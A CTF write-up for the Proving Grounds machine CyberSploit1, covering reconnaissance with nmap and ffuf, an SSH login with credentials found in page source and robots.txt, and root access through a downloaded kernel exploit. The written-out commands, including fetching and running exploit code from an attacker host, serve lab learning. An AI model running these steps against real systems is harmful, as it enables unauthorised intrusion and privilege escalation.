---
title: "CyberSploit 1"
date: 2024-09-29
draft: false
summary: "Writeup for the CyberSploit1 proving grounds CTF challenge."
tags: ["linux", "hardcoded creds", "kernel exploit"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/cybersploit1/cover.webp"
  caption: "CyberSploit1 Proving Grounds Challenge"
  alt: "CyberSploit1 cover"
platform: "Misc"
---

**CyberSploit** is an easy CTF challenge on Offsec's Proving Ground Play. It requires us to capture 2 flags by exploiting different vulnerabilities and misconfigurations on the target.
<!--more-->
To access the machine, click on the link given below:
- https://portal.offsec.com/labs/play

## Reconnaissance

I performed an **nmap** aggressive scan to find running ports, services and os related information.

```shell
nmap -A -p- TARGET -oN cybersploit1 --min-rate 10000
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |

![](https://cdn.ziomsec.com/cybersploit1/1.webp)

## Foothold

Since the target was running a web application, I accessed it using my browser and found a static webpage.

![](https://cdn.ziomsec.com/cybersploit1/2.webp)

The page did not reveal anything useful initially so I viewed the page source and found a username commented out towards the end of the **html** document.

![](https://cdn.ziomsec.com/cybersploit1/3.webp)

Next I performed web fuzzing using **ffuf** and discovered the **robots.txt** file.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
```

![](https://cdn.ziomsec.com/cybersploit1/4.webp)

Accessing **`/robots.txt`** revealed a base64 encoded string. So I decoded it using the **base64** command line utility.

```shell
curl http://TARGET/robots.txt | base64 -d
```

![](https://cdn.ziomsec.com/cybersploit1/5.webp)

This seemed interesting but initially I had no idea what this meant. I did some more reconnaissance on the website and found nothing useful.

Since the target was running **ssh**, and I had discovered a username; I tried using this as a password to log into the system.

```shell
ssh itsskv@TARGET
# PASSWORD
```

![](https://cdn.ziomsec.com/cybersploit1/6.webp)

After getting initial access, I listed out the contents of my current directory and found the first flag in **local.txt**.

```shell
cat local.txt
```

![](https://cdn.ziomsec.com/cybersploit1/7.webp)

## Privilege Escalation

For privilege escalation, I downloaded **linux smart enumeration** script from github on my local system and transferred it to the target.

```shell
 $ wget "http://KALI:8080/lse.sh"
 $ chmod +x lse.sh
```

![](https://cdn.ziomsec.com/cybersploit1/8.webp)

I executed the script and found some interesting results.

![](https://cdn.ziomsec.com/cybersploit1/9.webp)
![](https://cdn.ziomsec.com/cybersploit1/10.webp)
![](https://cdn.ziomsec.com/cybersploit1/11.webp)

The script identified a couple of misconfigurations which I looked into but found nothing interesting. I then tried looking for kernel exploits. I viewed my kernel version using the following command:

```bash
uname -r
```

I googled available exploits for the version and found some on **exploit db**.

![](https://cdn.ziomsec.com/cybersploit1/12.webp)

![](https://cdn.ziomsec.com/cybersploit1/13.webp)

I downloaded the exploit on my system and started a python http server to transfer it on the target.

```shell
python3 -m http.server 8080
```

![](https://cdn.ziomsec.com/cybersploit1/14.webp)

I downloaded the exploit from my local machine and compiled it using **gcc**.

```shell
$ wget "http://KALI:8080/37292.c"
$ gcc 37292.c -o priv
```

![](https://cdn.ziomsec.com/cybersploit1/15.webp)

Finally I ran the exploit and got root shell.

```shell
$ chmod +x priv
$ ./priv
```

![](https://cdn.ziomsec.com/cybersploit1/16.webp)

I spawned a pty shell and then navigated to the `/root` directory to capture the final flag.

```shell
$ export TERM=xterm
$ python -c 'import pty;pty.spawn("/bin/bash")'
$ cat proof.txt
```

![](https://cdn.ziomsec.com/cybersploit1/17.webp)

## Closure

Here's a summary of how I pwned the machine:
- I found the username to be hardcoded in the html page.
- I performed web fuzzing and found `/robots.txt`
- I found the password in base64 encoded format in `/robots.txt`.
- I used the username and password to get initial access.
- I found the first flag in my home directory.
- I exploited the kernel to escalate my privilege.
- I captured the final flag from the `root` directory.

Happy Hacking! 🎉

---





























